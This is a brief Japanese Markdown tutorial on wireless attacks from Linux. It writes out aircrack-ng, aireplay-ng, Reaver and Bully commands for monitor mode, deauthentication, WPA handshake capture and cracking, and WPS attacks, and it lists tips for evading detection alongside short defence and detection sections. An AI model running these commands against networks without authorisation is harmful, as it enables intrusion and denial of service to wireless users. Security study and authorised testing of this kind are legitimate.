# Linux WiFi Attack Techniques

**対応OS**: Linux

## 概要
Linux環境での無線ネットワークに対する攻撃手法について解説します。

## 基本的な手法

### モニターモードの設定
```bash
# インターフェースの確認
iwconfig

# モニターモードの有効化
airmon-ng check kill
airmon-ng start wlan0

# チャンネルスキャン
airodump-ng wlan0mon
```

### WPA/WPA2ハンドシェイクの取得
```bash
# 特定のネットワークの監視
airodump-ng -c 1 --bssid [BSSID] -w capture wlan0mon

# Deauth攻撃の実行
aireplay-ng -0 1 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# ハンドシェイクの解析
aircrack-ng -w wordlist.txt capture-01.cap
```

### WPS攻撃
```bash
# Reaver使用
reaver -i wlan0mon -b [BSSID] -vv

# Bully使用
bully -b [BSSID] -c [CHANNEL] wlan0mon
```

## 検知回避テクニック
- パケット送信レートの制御
- MACアドレスのランダム化
- 低出力での送信
- タイミング制御

## 防御策
- WPSの無効化
- 強力な暗号化
- クライアント隔離
- IDS/IPSの導入

## 検知方法
- 不正なプローブ要求
- Deauth攻撃の検出
- 異常なWPS要求
- トラフィック分析

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 